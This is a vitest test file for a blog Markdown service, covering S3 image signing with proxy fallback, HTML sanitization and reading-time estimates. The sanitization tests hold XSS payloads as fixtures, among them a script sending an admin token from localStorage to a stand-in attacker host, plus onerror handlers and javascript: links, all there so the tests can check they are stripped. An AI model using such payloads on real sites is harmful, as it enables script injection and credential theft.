import { marked } from "marked";
import { beforeEach, describe, expect, it, vi } from "vitest";

const { getS3ImageUrl, redisMock } = vi.hoisted(() => ({
  getS3ImageUrl: vi.fn(),
  redisMock: { get: vi.fn(), set: vi.fn(), del: vi.fn(), keys: vi.fn() },
}));

// Mocked at the primitives rather than at signedImageService, so every
// assertion runs the real signing, caching and null-on-failure contract.
vi.mock("@/utils/s3", () => ({ getS3ImageUrl }));
vi.mock("@/utils/redisClient", () => ({ default: redisMock }));
vi.mock("@/utils/logger", () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

import {
  BLOG_WORDS_PER_MINUTE,
  blogPlainText,
  estimateReadingMinutes,
  renderBlogMarkdown,
} from "./blogContentService";

const KEY = "blog-media/blog-content-media/pour.jpg";
const LEGACY_URL =
  "https://pnw-bucket.s3.us-west-2.amazonaws.com/blog-media/blog-content-media/old.jpg";
const LEGACY_KEY = "blog-media/blog-content-media/old.jpg";

/** A URL shaped like a real presigned S3 URL, signature and all. */
const signedFor = (key: string) =>
  `https://pnw-bucket.s3.us-west-2.amazonaws.com/${key}?X-Amz-Signature=abc&X-Amz-Credential=AK%2F20260101`;

/** The src attribute of the nth <img> in a rendered document. */
function imgSrcs(html: string): string[] {
  return [...html.matchAll(/<img src="([^"]*)"/g)].map((match) => match[1]);
}

beforeEach(() => {
  vi.clearAllMocks();
  redisMock.get.mockResolvedValue(null);
  redisMock.set.mockResolvedValue("OK");
  getS3ImageUrl.mockImplementation(async (key: string) => signedFor(key));
});

describe("renderBlogMarkdown image resolution", () => {
  it("renders a stored blog-media key as a directly fetchable signed URL", async () => {
    // The point of the change: no `/api/media` hop, and a URL stable enough to
    // be cached downstream.
    const html = await renderBlogMarkdown(`![Pour](${KEY})`);

    expect(imgSrcs(html)).toEqual([signedFor(KEY)]);
    expect(html).not.toContain("/api/media");
    expect(getS3ImageUrl).toHaveBeenCalledWith(KEY);
  });

  it("extracts the key from a legacy absolute bucket URL and signs that", async () => {
    const html = await renderBlogMarkdown(`![Old](${LEGACY_URL})`);

    expect(getS3ImageUrl).toHaveBeenCalledWith(LEGACY_KEY);
    expect(imgSrcs(html)).toEqual([signedFor(LEGACY_KEY)]);
  });

  it("preserves the alt text of a resolved image", async () => {
    const html = await renderBlogMarkdown(`![A careful pour](${KEY})`);

    expect(html).toContain('alt="A careful pour"');
  });

  it.each([
    ["an external https URL", "https://cdn.example.com/photo.jpg"],
    ["a relative path", "/images/local.png"],
    ["a protocol-relative URL", "//cdn.example.com/photo.jpg"],
  ])("passes %s through untouched and never signs it", async (_label, href) => {
    const html = await renderBlogMarkdown(`![Ext](${href})`);

    expect(imgSrcs(html)).toEqual([href]);
    expect(getS3ImageUrl).not.toHaveBeenCalled();
  });

  it("resolves several images concurrently rather than one at a time", async () => {
    // A post with N inline photos must cost one round-trip, not N. A sequential
    // pass would never issue the second request while the first was pending.
    const resolvers = new Map<string, (url: string) => void>();
    getS3ImageUrl.mockImplementation(
      (key: string) =>
        new Promise<string>((resolve) => resolvers.set(key, resolve)),
    );
    const keys = ["blog-media/a.jpg", "blog-media/b.jpg", "blog-media/c.jpg"];

    const rendered = renderBlogMarkdown(
      keys.map((key) => `![x](${key})`).join("\n\n"),
    );
    await vi.waitFor(() =>
      expect(getS3ImageUrl).toHaveBeenCalledTimes(keys.length),
    );
    for (const key of keys) resolvers.get(key)?.(signedFor(key));

    expect(imgSrcs(await rendered)).toEqual(keys.map(signedFor));
  });
});

describe("renderBlogMarkdown fallback to the media proxy", () => {
  it("falls back to /api/media when the signer echoes the raw key back", async () => {
    // How signing actually fails in production: getS3ImageUrl returns its input
    // unchanged when the AWS env vars are missing.
    getS3ImageUrl.mockImplementation(async (key: string) => key);

    const html = await renderBlogMarkdown(`![Pour](${KEY})`);

    expect(imgSrcs(html)).toEqual([
      `/api/media?key=${encodeURIComponent(KEY)}`,
    ]);
  });

  it("falls back to /api/media when the signer throws", async () => {
    getS3ImageUrl.mockRejectedValue(new Error("credential provider failed"));

    const html = await renderBlogMarkdown(`![Pour](${KEY})`);

    expect(imgSrcs(html)).toEqual([
      `/api/media?key=${encodeURIComponent(KEY)}`,
    ]);
  });

  it("encodes a legacy URL's key into the proxy exactly as the old path did", async () => {
    getS3ImageUrl.mockImplementation(async (key: string) => key);

    const html = await renderBlogMarkdown(`![Old](${LEGACY_URL})`);

    expect(imgSrcs(html)).toEqual([
      `/api/media?key=${encodeURIComponent(LEGACY_KEY)}`,
    ]);
  });

  it("still resolves a signed URL when the cache read faults", async () => {
    redisMock.get.mockRejectedValue(new Error("redis down"));

    const html = await renderBlogMarkdown(`![Pour](${KEY})`);

    expect(imgSrcs(html)).toEqual([signedFor(KEY)]);
  });

  it("keeps a resolvable image when a sibling image cannot be signed", async () => {
    getS3ImageUrl.mockImplementation(async (key: string) =>
      key === "blog-media/b.jpg" ? key : signedFor(key),
    );

    const html = await renderBlogMarkdown(
      "![a](blog-media/a.jpg)\n\n![b](blog-media/b.jpg)",
    );

    expect(imgSrcs(html)).toEqual([
      signedFor("blog-media/a.jpg"),
      "/api/media?key=blog-media%2Fb.jpg",
    ]);
  });
});

describe("renderBlogMarkdown non-image output", () => {
  const PROSE = [
    "# Heading",
    "",
    "Some **bold** text with a [link](https://example.com/post) and `code`.",
    "",
    "- one",
    "- two",
    "",
    "> a quote",
    "",
    "```js",
    "const x = 1;",
    "```",
    "",
    "| a | b |",
    "| - | - |",
    "| 1 | 2 |",
  ].join("\n");

  it("renders markdown without images byte-identically to marked's default", async () => {
    await expect(renderBlogMarkdown(PROSE)).resolves.toBe(marked.parse(PROSE));
    expect(getS3ImageUrl).not.toHaveBeenCalled();
    expect(redisMock.get).not.toHaveBeenCalled();
  });

  it("leaves every non-image token untouched in a post that has images", async () => {
    const withImage = `${PROSE}\n\n![Pour](${KEY})`;

    const html = await renderBlogMarkdown(withImage);

    expect(html.replace(/<p><img[^>]*><\/p>\n/, "")).toBe(marked.parse(PROSE));
  });

  it.each([
    ["empty content", ""],
    ["whitespace-only content", "   \n\n  "],
    ["an unterminated image token", "![broken](blog-media/a.jpg"],
    ["an unterminated code fence", "```js\nconst x = 1;"],
    ["bare brackets", "![](<>)[]()"],
  ])("renders %s without throwing", async (_label, markdown) => {
    await expect(renderBlogMarkdown(markdown)).resolves.toEqual(
      expect.any(String),
    );
  });
});

describe("renderBlogMarkdown sanitization", () => {
  // The two payloads reproduced against the installed marked 18.0.5, which
  // emitted both verbatim. The output is injected with dangerouslySetInnerHTML
  // from a server component, so a surviving <script> runs on first load.
  const RAW_IMG = '<img src=x onerror="alert(document.domain)">';
  const RAW_SCRIPT =
    '<script>fetch("https://evil.example/?t="+localStorage.getItem("adminToken"))</script>';

  /** Every href the rendered document would navigate to. */
  function hrefs(html: string): string[] {
    return [...html.matchAll(/href="([^"]*)"/g)].map((match) => match[1]);
  }

  it("drops a raw script token instead of emitting it into the document", async () => {
    const html = await renderBlogMarkdown(`Intro.\n\n${RAW_SCRIPT}\n\nOutro.`);

    expect(html).not.toContain("<script");
    expect(html).not.toContain("localStorage");
    expect(html).toContain("<p>Intro.</p>");
    expect(html).toContain("<p>Outro.</p>");
  });

  it("drops a raw img token carrying an event handler", async () => {
    const html = await renderBlogMarkdown(RAW_IMG);

    expect(imgSrcs(html)).toEqual([]);
    expect(html).not.toContain("onerror");
  });

  it("keeps the prose a stripped inline tag wrapped", async () => {
    // The markup goes, the sentence stays: stripping must not delete content
    // along with the tag that surrounded it.
    const html = await renderBlogMarkdown(
      'before <span onmouseover="alert(1)">hover</span> after',
    );

    expect(html).toBe("<p>before hover after</p>\n");
  });

  it.each([
    ["a table cell", `| a |\n| - |\n| ${RAW_IMG} |`],
    ["a blockquote", `> ${RAW_IMG}`],
    ["a list item", `- ${RAW_IMG}`],
    ["a heading", `# ${RAW_IMG}`],
  ])("drops raw HTML smuggled through %s", async (_label, markdown) => {
    const html = await renderBlogMarkdown(markdown);

    expect(html).not.toContain("onerror");
    expect(html).not.toContain("<img");
  });

  it("renders a javascript: link as its own text, with no anchor", async () => {
    expect(await renderBlogMarkdown("[proto](javascript:alert(1))")).toBe(
      "<p>proto</p>\n",
    );
  });

  it.each([
    ["an entity-smuggled tab", "[x](java&#09;script:alert(1))"],
    ["a leading control byte", "[x](\u0001javascript:alert(1))"],
    ["leading whitespace", "[x](   javascript:alert(1))"],
    ["a data: URL", "[x](data:text/html;base64,PHN2Zz48L3N2Zz4=)"],
    ["a vbscript: URL", "[x](vbscript:msgbox(1))"],
    ["an autolink", "<javascript:alert(1)>"],
    ["a reference definition", "[x][1]\n\n[1]: javascript:alert(1)"],
  ])("emits no href for %s", async (_label, markdown) => {
    // The scheme allowlist is a positive match on the href with the characters
    // a browser discards already removed, so every encoding trick that fails to
    // look like http/mailto is rejected rather than matched against a denylist.
    expect(hrefs(await renderBlogMarkdown(markdown))).toEqual([]);
  });

  it.each([
    ["a javascript: source", "![pic](javascript:alert(1))"],
    ["an entity-smuggled tab", "![pic](java&#09;script:alert(1))"],
    ["a reference definition", "![pic][1]\n\n[1]: javascript:alert(1)"],
  ])("drops an image with %s", async (_label, markdown) => {
    // Images render through a different renderer method than links, so the
    // allowlist has to be applied to both.
    const html = await renderBlogMarkdown(markdown);

    expect(imgSrcs(html)).toEqual([]);
    expect(html).not.toContain("javascript:");
  });

  it.each([
    [
      "an external https link",
      "[e](https://example.com/post)",
      "https://example.com/post",
    ],
    [
      "a mailto link",
      "[m](mailto:hello@example.com)",
      "mailto:hello@example.com",
    ],
    ["an in-page anchor", "[a](#ingredients)", "#ingredients"],
    ["a site-relative link", "[s](/classes)", "/classes"],
  ])("keeps %s", async (_label, markdown, href) => {
    expect(hrefs(await renderBlogMarkdown(markdown))).toEqual([href]);
  });

  it("keeps a bare relative image path the signer never touches", async () => {
    // walkTokens only rewrites blog-media keys, so this reaches the renderer
    // unchanged. A scheme check that treated every bare path as suspicious
    // would silently delete it.
    const html = await renderBlogMarkdown("![local](images/local.png)");

    expect(imgSrcs(html)).toEqual(["images/local.png"]);
  });

  it("leaves ordinary formatting byte-identical while stripping a payload", async () => {
    const prose = [
      "**bold** and `code`",
      "",
      "- one",
      "- two",
      "",
      "| a | b |",
      "| - | - |",
      "| 1 | 2 |",
    ].join("\n");

    const html = await renderBlogMarkdown(`${prose}\n\n${RAW_SCRIPT}`);

    expect(html).not.toContain("<script");
    expect(html).toBe(marked.parse(prose));
  });
});

describe("blogPlainText", () => {
  it.each([
    ["a fenced code block", "a\n\n```js\nconst x = 1;\n```\n\nb", "a b"],
    ["inline code", "a `const x = 1` b", "a b"],
    ["an image token and its key", `a ![alt](${KEY}) b`, "a b"],
    ["a raw HTML tag", "a <span class='x'>b</span> c", "a b c"],
    ["a bare URL", "a https://example.com/a/long/path b", "a b"],
    ["heading, list and quote markers", "# a\n\n- b\n\n1. c\n\n> d", "a b c d"],
    ["emphasis markers", "**a** _b_ ~c~", "a b c"],
  ])("strips %s", (_label, markdown, expected) => {
    expect(blogPlainText(markdown)).toBe(expected);
  });

  it("keeps a link's text and drops its href", () => {
    expect(
      blogPlainText("[read the full study](https://example.com/a/b)"),
    ).toBe("read the full study");
  });

  it.each([
    [
      "a link",
      "Read about [gin](https://en.wikipedia.org/wiki/Gin_(spirit)) today.",
    ],
    [
      "an image",
      "Read about ![gin](https://en.wikipedia.org/wiki/Gin_(spirit).jpg) today.",
    ],
  ])(
    "consumes %s whose URL contains parentheses, tail and all",
    (_label, markdown) => {
      // A flat `[^)]*` href stopped at the first `)` and left the rest of the
      // destination — `) ` — in the prose. A Wikipedia disambiguation link is the
      // realistic case.
      expect(blogPlainText(markdown)).not.toContain(")");
    },
  );

  it("keeps the text of a link whose URL contains parentheses", () => {
    expect(
      blogPlainText(
        "Read about [gin](https://en.wikipedia.org/wiki/Gin_(spirit)) today.",
      ),
    ).toBe("Read about gin today.");
  });

  it.each([
    [
      "script",
      "Prose. <script>stealToken()</script> More prose.",
      "Prose. More prose.",
    ],
    ["style", "Prose. <style>.a{color:red}</style> More.", "Prose. More."],
  ])(
    "drops a <%s> element's body, not just its tags",
    (_label, markdown, expected) => {
      // Stripping tags alone kept the body, so a post carrying a <script> put its
      // JavaScript into the meta description, the social card and the word count
      // — content `renderBlogMarkdown` correctly drops from the page itself.
      expect(blogPlainText(markdown)).toBe(expected);
    },
  );

  it("drops an unclosed raw-text element through to the end of the input", () => {
    expect(blogPlainText("Prose. <script>stealToken()")).toBe("Prose.");
  });

  it("collapses runs of whitespace and trims the result", () => {
    expect(blogPlainText("  a  \n\n   b\t\tc  ")).toBe("a b c");
  });

  it.each([
    ["empty content", ""],
    ["whitespace-only content", "   \n\n  "],
  ])("returns an empty string for %s", (_label, markdown) => {
    expect(blogPlainText(markdown)).toBe("");
  });

  it("returns the full text untruncated — truncation is the caller's", () => {
    // The blog page clips this to a meta-description length. That limit is a
    // metadata concern and means nothing to the word counter that shares the
    // helper, so it must not live here.
    const long = Array(400).fill("word").join(" ");

    expect(blogPlainText(long)).toBe(long);
  });

  it("is the single stripping pass behind the reading estimate", () => {
    const noisy = `# Title\n\n\`\`\`js\nconst x = 1;\n\`\`\`\n\n![a](${KEY})\n\nSome real prose here.`;

    expect(estimateReadingMinutes(noisy)).toBe(
      estimateReadingMinutes(blogPlainText(noisy)),
    );
    expect(blogPlainText(noisy)).toBe("Title Some real prose here.");
  });
});

describe("estimateReadingMinutes", () => {
  const words = (count: number) => Array(count).fill("word").join(" ");

  it("reports 0 minutes for content with no prose", () => {
    expect(estimateReadingMinutes("")).toBe(0);
    expect(estimateReadingMinutes("   \n\n---\n\n")).toBe(0);
  });

  it("floors a very short post at one minute rather than zero", () => {
    expect(estimateReadingMinutes(words(12))).toBe(1);
  });

  it("divides the word count by the stated reading rate", () => {
    expect(estimateReadingMinutes(words(BLOG_WORDS_PER_MINUTE * 5))).toBe(5);
  });

  it("rounds to the nearest whole minute", () => {
    const wordsFor = (minutes: number) =>
      words(Math.round(BLOG_WORDS_PER_MINUTE * minutes));

    expect(estimateReadingMinutes(wordsFor(2.4))).toBe(2);
    expect(estimateReadingMinutes(wordsFor(2.6))).toBe(3);
  });

  it("does not let an image token's S3 key count as prose", () => {
    // The key is a long unread string; counting it would inflate short posts.
    const plain = words(100);
    const withImages = `${plain}\n\n![a cocktail photo](blog-media/blog-content-media/a-very-long-file-name.jpg)`;

    expect(estimateReadingMinutes(withImages)).toBe(
      estimateReadingMinutes(plain),
    );
  });

  it("counts a link's text but not its href", () => {
    expect(
      estimateReadingMinutes(
        "[read the full study](https://example.com/a/very/long/path/to/a/study)",
      ),
    ).toBe(estimateReadingMinutes("read the full study"));
  });

  it("ignores fenced code, inline code, HTML tags and bare URLs", () => {
    const noisy = [
      words(100),
      "```js",
      Array(500).fill("const someVariable = 1;").join("\n"),
      "```",
      "`inline`",
      "<div class='wrapper'>",
      "https://example.com/a/long/bare/url",
      "</div>",
    ].join("\n");

    expect(estimateReadingMinutes(noisy)).toBe(
      estimateReadingMinutes(words(100)),
    );
  });

  it("ignores list, heading and blockquote markers", () => {
    expect(estimateReadingMinutes("# a\n\n- b\n- c\n\n1. d\n\n> e")).toBe(
      estimateReadingMinutes("a b c d e"),
    );
  });
});
